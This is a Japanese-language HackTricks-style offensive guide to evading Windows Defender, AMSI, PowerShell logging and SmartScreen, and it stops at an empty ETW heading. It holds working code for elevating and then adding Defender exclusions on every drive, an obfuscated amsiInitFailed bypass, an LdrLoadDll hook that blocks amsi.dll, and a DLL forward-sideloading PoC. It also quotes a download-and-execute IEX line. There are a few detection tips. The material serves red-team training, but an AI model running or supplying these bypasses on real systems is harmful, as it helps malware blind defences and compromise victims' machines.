# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**このページの執筆者は** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defenderを停止する

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defenderの動作を停止させるツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別のAVを偽装してWindows Defenderの動作を停止させるツール。
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Defenderを操作する前のインストーラ風のUAC誘導

ゲームチートに偽装した公開ローダーは、未署名のNode.js/Nexeインストーラとして配布されることが多く、まず**ユーザーに昇格を要求**してからDefenderを無効化します。フローは単純です:

1. `net session`で管理者コンテキストを確認します。このコマンドは呼び出し元が管理者権限を持っている場合にのみ成功するため、失敗するとローダーが標準ユーザーとして実行されていることを示します。
2. 元のコマンドラインを保持したまま期待されるUAC同意プロンプトを発生させるため、`RunAs` verb で即座に自身を再起動します。
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
被害者は既に“cracked”ソフトをインストールしていると信じているため、プロンプトは通常受け入れられ、マルウェアが Defender のポリシーを変更するために必要な権限が付与される。

### すべてのドライブ文字に対する包括的な `MpPreference` 除外

一旦昇格すると、GachiLoader-style chains はサービスを完全に無効化するのではなく Defender の盲点を最大化する。ローダーはまず GUI のウォッチドッグ (`taskkill /F /IM SecHealthUI.exe`) を終了させ、次に **極めて広範な除外** を適用して、すべてのユーザープロファイル、システムディレクトリ、取り外し可能ディスクがスキャン不可になるようにする：
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
主要な観察点:

- ループはすべてのマウントされたファイルシステム（D:\, E:\, USB sticks, etc.）を巡回するため、**ディスク上のどこに将来ペイロードがドロップされても無視される**。
- `.sys` 拡張子の除外は将来を見越したもので、攻撃者は後で署名のないドライバをロードする選択肢を残したまま Defender に触れないことができる。
- すべての変更は `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` の下に入るため、後続の段階で除外が持続しているか確認したり、UAC を再トリガーせずに拡張したりできる。

Defender のサービスは停止されないため、素朴なヘルスチェックは「antivirus active」と報告し続けるが、リアルタイム検査はこれらのパスに一切触れていない。

## **AV Evasion Methodology**

現在、AV はファイルが悪意あるかどうかを判定するために、static detection、dynamic analysis、そしてより高度な EDR では behavioural analysis といった異なる方法を使っている。

### **Static detection**

Static detection は、バイナリやスクリプト内の既知の悪意ある文字列やバイト配列をフラグ付けしたり、ファイル自身から情報を抽出したり（例：file description、company name、digital signatures、icon、checksum 等）することで行われる。つまり、既知の公開ツールを使うと検出されやすい可能性が高い（既に解析されてフラグ付けされているため）。この種の検出を回避する方法はいくつかある：

- **Encryption**

バイナリを暗号化すれば、AV がプログラムを検出する手段はなくなるが、メモリ上で復号して実行するための何らかのローダーが必要になる。

- **Obfuscation**

バイナリやスクリプト内のいくつかの文字列を変えるだけで AV を通せることがあるが、何を難読化するかによっては手間が掛かることがある。

- **Custom tooling**

自分でツールを開発すれば既知の悪いシグネチャは存在しないが、これは多くの時間と労力を要する。

> [!TIP]
> Windows Defender の static detection に対してチェックする良い方法は [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) だ。ファイルを複数のセグメントに分割し、それぞれを Defender に個別にスキャンさせることで、どの文字列やバイトがフラグ付けされているかを正確に示してくれる。

実践的な AV Evasion に関するこの [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) も強くおすすめする。

### **Dynamic analysis**

Dynamic analysis は AV がバイナリをサンドボックスで実行し、悪意のある振る舞い（例：ブラウザのパスワードを復号して読む試み、LSASS の minidump を実行する等）を監視するものだ。ここはやや厄介だが、サンドボックスを回避するためにできることがいくつかある。

- **Sleep before execution** 実装次第では、AV の dynamic analysis を回避する良い方法になり得る。AV はユーザのワークフローを阻害しないようスキャン時間が非常に短いため、長いスリープを使うとバイナリの解析を妨げられることがある。ただし、多くの AV のサンドボックスは実装次第でスリープをスキップしてしまうことがあるのが問題点だ。
- **Checking machine's resources** 通常サンドボックスは利用できるリソースが非常に少ない（例：< 2GB RAM）ため、そうでなければユーザのマシンを遅くしてしまう。ここでは CPU 温度やファン速度をチェックするなど創造的な手法も使える。サンドボックスにすべてが実装されているわけではない。
- **Machine-specific checks** もしターゲットが "contoso.local" ドメインに参加しているワークステーションなら、コンピュータのドメインをチェックして指定したものと一致しなければプログラムを終了させる、といったことができる。

実は Microsoft Defender の Sandbox の computername は HAL9TH なので、デトネーション前にマルウェア側でコンピュータ名をチェックし、名前が HAL9TH と一致するなら Defender の sandbox 内にいることになるためプログラムを終了させることができる。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

サンドボックス対策に関する @mgeeky (https://twitter.com/mariuszbit) の他の非常に良いヒント

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

前述の通り、**public tools** は最終的に **検出される** ので、自分にこう問いかけるべきだ：

例えば、LSASS をダンプしたい場合、**本当に mimikatz を使う必要があるのか**？それとも LSASS をダンプする、あまり知られていない別のプロジェクトを使えるのではないか。

正しい答えはおそらく後者だ。mimikatz を例に取れば、AV や EDR に最もフラグ付けされるツールの一つであり、プロジェクト自体は素晴らしいが、AV を回避するためにそれを扱うのは悪夢になり得る。達成したいことに対する代替手段を探すべきだ。

> [!TIP]
> 回避のためにペイロードを変更する場合、defender の自動サンプル送信を **オフにする** ことを忘れないでほしい。そして、本当に長期的な回避が目的なら、マジで **DO NOT UPLOAD TO VIRUSTOTAL**。特定の AV に対する検出状況を確認したいなら、VM にその AV をインストールして、自動サンプル送信をオフにし、満足するまでそこでテストすること。

## EXEs vs DLLs

可能な限り、回避のためには常に **DLLs を優先する** べきだ。私の経験では、DLL ファイルは通常 **遥かに検出されにくく** 解析されにくいことが多く、もしペイロードが DLL として実行できる方法を持っているなら、それを使うのはごく単純なトリックで検出を避けるのに有効だ。

この画像のように、Havoc の DLL ペイロードは antiscan.me で検出率が 4/26 であるのに対し、EXE ペイロードは 7/26 の検出率を示している。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me における通常の Havoc EXE ペイロードと通常の Havoc DLL の比較</p></figcaption></figure>

以下では、DLL ファイルを使ってよりステルスにするためのいくつかのトリックを紹介する。

## DLL Sideloading & Proxying

**DLL Sideloading** は、ローダーが使用する DLL 検索順序を利用して、被害者アプリケーションと悪意のあるペイロードを同じ場所に配置することで成立する。

[Siofra](https://github.com/Cybereason/siofra) と次の powershell スクリプトを使って、DLL Sideloading に脆弱なプログラムをチェックできる:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
このコマンドは "C:\Program Files\\" 内で DLL hijacking の影響を受けやすいプログラムの一覧と、それらがロードしようとする DLL ファイルを出力します。

私は **DLL Hijackable/Sideloadable programs を自分で調査する**ことを強くお勧めします。適切に行えばこの手法はかなりステルスですが、公開されている DLL Sideloadable programs を使用すると簡単に検出される可能性があります。

単にプログラムがロードすると期待する名前の悪意ある DLL を置くだけでは、ペイロードが実行されないことがあります。プログラムはその DLL 内に特定の関数を期待しているためです。これを解決するために、別の手法である **DLL Proxying/Forwarding** を使用します。

**DLL Proxying** は、プログラムが行う呼び出しを proxy（および悪意ある）DLL から元の DLL に転送することで、プログラムの機能を維持しつつペイロードの実行を処理できるようにします。

私は [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) プロジェクトを [@flangvik](https://twitter.com/Flangvik/) から使用します。

私が行った手順は次のとおりです：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最後のコマンドは2つのファイルを生成します: DLLのソースコードテンプレートと、名前を変更した元のDLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading については、[S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) と [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) の視聴を**強くお勧めします**。これらは本稿で扱った内容をより深く学ぶのに役立ちます。

### Forwarded Exports の悪用 (ForwardSideLoading)

Windows PE モジュールは、実際には "forwarders" である関数をエクスポートすることがあります：コードを指す代わりに、エクスポートエントリには `TargetDll.TargetFunc` の形式の ASCII 文字列が含まれます。呼び出し側がそのエクスポートを解決すると、Windows ローダーは次のことを行います：

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

理解すべき重要な挙動:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

これにより、間接的な sideloading プリミティブが可能になります：サインされた DLL を見つけ、その中で非 KnownDLL モジュール名にフォワードされた関数をエクスポートしているものを特定し、そのサイン済み DLL と、フォワード先とまったく同じ名前の攻撃者管理下の DLL を同じ場所に置きます。フォワードされたエクスポートが呼び出されると、ローダーはフォワードを解決し、同じディレクトリからあなたの DLL をロードして DllMain を実行します。

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順で解決されます。

PoC (copy-paste):
1) サイン済みのシステムDLLを書き込み可能なフォルダにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 同じフォルダに悪意のある `NCRYPTPROV.dll` を配置します。最小限の DllMain だけでコード実行が可能です。DllMain をトリガーするために forwarded function を実装する必要はありません。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 署名された LOLBin で転送をトリガーする:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32（署名済み）が side-by-side の `keyiso.dll`（署名済み）をロードする
- `KeyIsoSetAuditingInterface` を解決する際、ローダーはフォワード先の `NCRYPTPROV.SetAuditingInterface` に従う
- ローダーは `C:\test` から `NCRYPTPROV.dll` をロードし、その `DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合、`DllMain` が既に実行された後でのみ "missing API" エラーが発生する

Hunting tips:
- ターゲットモジュールが KnownDLL でない forwarded exports に注目する。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に列挙されている。
- forwarded exports は次のようなツールで列挙できる:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 候補を検索するには Windows 11 forwarder のインベントリを参照してください: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitor LOLBins (e.g., `rundll32.exe`) が非システムパスから署名済みDLLをロードし、そのディレクトリから同じベース名の non-KnownDLLs を続けてロードする動作を監視する
- ユーザー書き込み可能なパス上で、`rundll32.exe` → 非システムの `keyiso.dll` → `NCRYPTPROV.dll` のようなプロセス/モジュールチェーンでアラートする
- code integrity ポリシー (WDAC/AppLocker) を適用し、アプリケーションディレクトリでの write+execute を拒否する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze を使用して、shellcode をステルス的にロードおよび実行できます。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 回避は猫とネズミのいたちごっこに過ぎません。今日有効な手法が明日には検知されることがあるため、単一のツールにのみ依存しないでください。可能なら複数の回避技術を組み合わせて使ってください。

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs はしばしば `ntdll.dll` の syscall スタブに **user-mode inline hooks** を仕掛けます。これらのフックを回避するには、正しい **SSN** (System Service Number) をロードし、フックされた export entrypoint を実行せずにカーネルモードへ移行する、**direct** または **indirect** の syscall スタブを生成できます。

**Invocation options:**
- **Direct (embedded)**: 生成したスタブ内に `syscall`/`sysenter`/`SVC #0` 命令を埋め込みます（`ntdll` の export を呼び出さない）。
- **Indirect**: 既存の `ntdll` 内の `syscall` ガジェットにジャンプし、カーネルへの移行が `ntdll` 由来に見えるようにします（ヒューリスティック回避に有効）；**randomized indirect** は呼び出しごとにプールからガジェットを選択します。
- **Egg-hunt**: ディスク上に静的な `0F 05` オペコードシーケンスを埋め込むのを避け、ランタイムで syscall シーケンスを解決します。

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: スタブのバイトを読む代わりに、syscall スタブを仮想アドレス（VA）でソートして SSN を推定します。
- **SyscallsFromDisk**: クリーンな `\KnownDlls\ntdll.dll` をマップし、その `.text` から SSN を読み取り、アンマップします（メモリ上のすべてのフックを回避します）。
- **RecycledGate**: スタブがクリーンな場合は VA ソートによる SSN 推定とオペコード検証を組み合わせ、フックされている場合は VA 推定にフォールバックします。
- **HW Breakpoint**: `syscall` 命令に対して DR0 を設定し、VEH を使ってランタイムで `EAX` から SSN を取得することで、フックされたバイトを解析せずに済ませます。

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSIは"[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"を防ぐために作られた。初期のAVは**files on disk**のみをスキャンする能力しかなかったため、ペイロードを**directly in-memory**で実行できれば、AVは十分な可視性を持たず対処できなかった。

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

これにより、アンチウイルスはスクリプトの内容を暗号化されておらず難読化されていない形で取得でき、スクリプトの挙動を検査できる。

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` を先頭に付け、その後にスクリプトが実行された実行ファイルのパス（この場合は powershell.exe）が続いている点に注目。

ファイルをディスクに落としていないにもかかわらず、AMSIによってメモリ内で検知された。

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

AMSIを回避する方法はいくつかある:

- **Obfuscation**

AMSIは主に静的検知で動作するため、読み込ませるスクリプトを変更することで検知を回避できる場合がある。

しかし、AMSIは多層にわたる難読化であってもスクリプトを復元する能力を持っているため、難読化が必ずしも有効とは限らない。したがって回避は単純ではない。ただし、場合によっては変数名を少し変更するだけで済むこともあり、どの程度フラグが立っているかによる。

- **AMSI Bypass**

AMSIはDLLをpowershell（および cscript.exe、wscript.exe 等）のプロセスにロードすることで実装されているため、権限の低いユーザーで実行中でも比較的容易に改変が可能である。この実装上の欠陥により、研究者たちはAMSI検査を回避する複数の方法を見つけている。

**Forcing an Error**

AMSIの初期化を失敗させる（amsiInitFailed）と現在のプロセスではスキャンが開始されなくなる。これは元々 [Matt Graeber](https://twitter.com/mattifestation) によって公開され、Microsoftはその広範な利用を防ぐシグネチャを開発した。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
現在の powershell プロセスで AMSI を使用不能にするのに必要だったのは、powershell のコード1行だけだった。もちろんその1行は AMSI 自身に検出されるため、この手法を使うには何らかの修正が必要だ。

こちらは私がこの [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から取った改変済みの AMSI bypass です。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

この手法は最初に [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見されました。ユーザが提供した入力をスキャンする amsi.dll 内の "AmsiScanBuffer" 関数のアドレスを見つけ、その関数を E_INVALIDARG を返す命令に上書きします。こうすることで実際のスキャン結果は 0（クリーン）として解釈されます。

> [!TIP]
> 詳しい説明は [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) をお読みください。

AMSI を powershell でバイパスする他の多くの手法も存在します。詳しくは [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) と [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) を参照してください。

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI は現在のプロセスに `amsi.dll` がロードされて初めて初期化されます。言語に依存しない堅牢なバイパス方法として、要求されたモジュールが `amsi.dll` の場合にエラーを返すように `ntdll!LdrLoadDll` にユーザーモードのフックを設置する方法があります。その結果、AMSI はロードされず、そのプロセス内ではスキャンが行われません。

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
注意
- PowerShell、WScript/CScript、およびカスタムローダーなど、AMSI をロードするあらゆる環境で動作します（通常は AMSI をロードするものすべて）。
- 長いコマンドラインの痕跡を避けるため、stdin 経由でスクリプトを供給する方法（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と組み合わせて使用してください。
- LOLBins を介して実行されるローダー（例: `regsvr32` が `DllRegisterServer` を呼ぶもの）で使用されるのが確認されています。

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**検出されたシグネチャを削除する**

次のようなツール、**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** および **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** を使って、現在のプロセスのメモリから検出された AMSI シグネチャを削除できます。これらのツールは、現在のプロセスのメモリを走査して AMSI シグネチャを検出し、それを NOP 命令で上書きして実質的にメモリから除去します。

**AMSI を使用する AV/EDR 製品**

AMSI を使用する AV/EDR 製品の一覧は **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できます。

**PowerShell version 2 を使う**

PowerShell version 2 を使用すると AMSI はロードされないため、スクリプトを AMSI によるスキャンなしで実行できます。以下のように実行します:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging は、システム上で実行されたすべての PowerShell コマンドを記録できる機能です。監査やトラブルシューティングには有用ですが、検知を回避したい攻撃者にとっては **問題となり得ます**。

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: この目的には [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) のようなツールを使用できます。
- **Use Powershell version 2**: PowerShell version 2 を使用すると AMSI はロードされないため、スクリプトを AMSI によるスキャンなしで実行できます。実行例: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使って防御なしの powershell を起動します（これは `powerpick` が Cobal Strike から使用するものです）。


## Obfuscation

> [!TIP]
> 多くの難読化手法はデータを暗号化することに依存しており、それによりバイナリのエントロピーが増加して AVs や EDRs に検出されやすくなります。これに注意し、機密性の高い部分や隠す必要のある特定のセクションのみに暗号化を適用することを検討してください。

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes. The workflow below reliably **ほぼオリジナルの IL を復元**し、後で dnSpy や ILSpy などのツールで C# にデコンパイルできます。

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
フラグ:
• `-p crx` – ConfuserEx 2 プロファイルを選択  
• de4dot は control-flow flattening を元に戻し、元の namespaces、classes、variable names を復元し、定数文字列を復号します。

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
このステップの後、opaque wrapper 関数（`Class8.smethod_10` など）の代わりに `Convert.FromBase64String` や `AES.Create()` のような通常の .NET API が見られるはずです。

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

上記のチェーンは、悪意のあるサンプルを実行することなく実行フローを**復元**できます — オフラインのワークステーションで作業する際に有用です。

> 🛈  ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成します。これはサンプルを自動的にトリアージするための IOC として使用できます。

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/) コンパイルスイートのオープンソースフォークを提供し、code obfuscation と tamper-proofing を通じてソフトウェアのセキュリティを向上させることです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator は、`C++11/14` 言語を使用して、外部ツールを使わず、コンパイラを変更せずにコンパイル時に obfuscated code を生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework によって生成される obfuscated operations のレイヤーを追加し、アプリケーションを解析しようとする人物の作業を少し難しくします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz は x64 binary obfuscator で、.exe, .dll, .sys を含む様々な pe files を obfuscate できます。
- [**metame**](https://github.com/a0rtega/metame): Metame は任意の executables 向けのシンプルな metamorphic code engine です。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator は ROP (return-oriented programming) を用いる、LLVM-supported languages 向けの細粒度な code obfuscation framework です。ROPfuscator は通常の命令を ROP chains に変換してプログラムを assembly code level で obfuscate し、通常の制御フローに対する直感を損ないます。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt は Nim で書かれた .NET PE Crypter です
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor は既存の EXE/DLL を shellcode に変換してロードできます

## SmartScreen & MoTW

インターネットからいくつかの executables をダウンロードして実行するときに、この画面を見たことがあるかもしれません。

Microsoft Defender SmartScreen は、潜在的に悪意のあるアプリケーションの実行からエンドユーザーを保護することを目的としたセキュリティ機構です。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen は主にレピュテーションベースのアプローチで動作します。つまり、一般的にダウンロードされないアプリケーションは SmartScreen をトリガーし、エンドユーザーに警告してファイルの実行を阻止します（ただし、ファイルは More Info -> Run anyway をクリックすることで実行可能です）。

**MoTW** (Mark of The Web) は、Zone.Identifier という名前の [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) で、インターネットからファイルをダウンロードした際に自動的に作成され、ダウンロード元の URL が含まれます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルの Zone.Identifier ADS を確認している様子。</p></figcaption></figure>

> [!TIP]
> 実行ファイルが **trusted** な署名証明書で署名されている場合、SmartScreen はトリガーされないことに注意してください。

payloads に Mark of The Web が付与されるのを防ぐ非常に有効な方法の一つは、ISO のようなコンテナにパッケージングすることです。これは Mark-of-the-Web (MOTW) が non NTFS volumes には適用できないためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) は、payloads を output containers にパッケージして Mark-of-the-Web を回避するツールです。

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

